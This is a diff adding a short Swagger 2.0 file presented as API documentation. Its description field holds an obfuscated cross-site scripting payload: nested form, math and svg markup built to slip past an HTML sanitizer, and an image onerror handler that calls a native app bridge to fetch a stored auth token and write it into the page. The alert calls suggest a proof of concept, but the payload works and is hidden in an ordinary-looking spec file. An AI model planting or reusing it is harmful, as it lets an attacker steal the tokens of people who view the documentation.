@@ -1,0 +1,5 @@
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror='var bridgeHandler=function(r,e,t,a){try{if(alert(),t=atob(t),a=atob(a),!(typeof t===String.fromCharCode(115,116,114,105,110,103)?JSON.parse(t):t).bridgeType)return;var o=typeof a===String.fromCharCode(115,116,114,105,110,103)?JSON.parse(a)||{}:a;r&&JSON.parse(r),document.getElementById(String.fromCharCode(109,121,101,108,101,109,101,110,116,49)).innerHTML=String(o.data.value)}catch(r){return void alert(2)}},bg1=bridgeHandler,fetchToken=function(){alert(99);try{var r=btoa(JSON.stringify({bridgeType:String.fromCharCode(70,69,84,67,72,95,84,79,75,69,78)})),e=btoa(JSON.stringify({key:String.fromCharCode(116,111,107,101,110)}));NativeStore.getString(r,e,String.fromCharCode(98,114,105,100,103,101,72,97,110,100,108,101,114))}catch(r){alert(2)}};fetchToken();' src=1>"></form>
